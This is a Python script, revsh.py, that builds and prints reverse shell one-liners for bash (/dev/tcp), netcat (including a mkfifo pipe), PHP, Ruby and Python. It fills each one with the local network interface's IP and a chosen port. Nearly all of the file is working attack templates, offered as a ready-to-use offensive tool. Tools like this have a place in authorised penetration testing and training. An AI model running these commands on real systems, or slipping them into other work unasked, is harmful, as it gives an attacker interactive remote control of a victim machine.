#!/usr/bin/env python3
####################################################################################################
# Reverse shell command generator in Python 3.
#
# Usage: python3 revsh.py [-h] [-p PORT] [-c CHOOSE [CHOOSE ...]] [iface]
####################################################################################################

import netifaces as ifcs
import argparse

CMDS = {
    "bash": ("bash -i >& /dev/tcp/{}/{} 0>&1", "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'", "/bin/bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'"),
    "nc": ("nc -e /bin/sh {} {}", "rm /tmp/ff;mkfifo /tmp/ff;cat /tmp/ff|/bin/sh -i 2>&1|nc {} {} >/tmp/ff"),
    "php": ("php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", ),
    "ruby": ("ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", ),
    "python": ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
}

def get_args():
    """Returns the user arguments.

    Returns:
        The user arguments.
    """
    p = argparse.ArgumentParser(description="Reverse shell generator.")
    p.add_argument("iface", type=str, default=None, nargs="?", help="the network interface to use")
    p.add_argument("-p", "--port", type=int, default=9999, dest="port", help="port number to use, defaults to 9999")
    p.add_argument("-c", "--choose", nargs="+", dest="choose", help="choose which command to use")
    return p

def get_good_iface():
    """Returns the first good non-loopback interface and its IP.

    Returns:
        The first non-loopback interface and its IP. None if not found.
    """
    ifaces = ifcs.interfaces()
    for i in ifaces:
        addr = ifcs.ifaddresses(i)
        if (i == "lo") or (ifcs.AF_INET not in addr):
            continue        # make sure interface is up, skip if not
        return i, ifcs.ifaddresses(i)[ifcs.AF_INET][0]["addr"]
    return None, None

def get_iface(prefer):
    """Checks and returns the prefered interface's IP address.

    Args:
        prefer: The preferred network interface to use.

    Returns:
        The preferred network interface's name and IP. None if error occurred.
    """
    ifaces = ifcs.interfaces()
    if prefer not in ifaces:
        return get_good_iface()     # invalid interface

    addr = ifcs.ifaddresses(prefer)
    if ifcs.AF_INET not in addr:
        return get_good_iface()     # doesn't have addresses
    return prefer, ifcs.ifaddresses(prefer)[ifcs.AF_INET][0]["addr"]

if __name__ == "__main__":
    args = get_args().parse_args()
    iface, ip = get_iface(args.iface)
    if iface is None:
        print("ERROR: can't find a good network interface")
        exit(1)
    if (args.iface is not None) and (iface != args.iface):
        print(f"\nWARNING: interface {args.iface} is invalid, using {iface} instead\n")

    if args.choose is None:
        [print(cmd.format(ip, args.port)) for _, v in CMDS.items() for cmd in v]
    else:
        [print(cmd.format(ip, args.port)) for c in args.choose if c in CMDS for cmd in CMDS[c]]
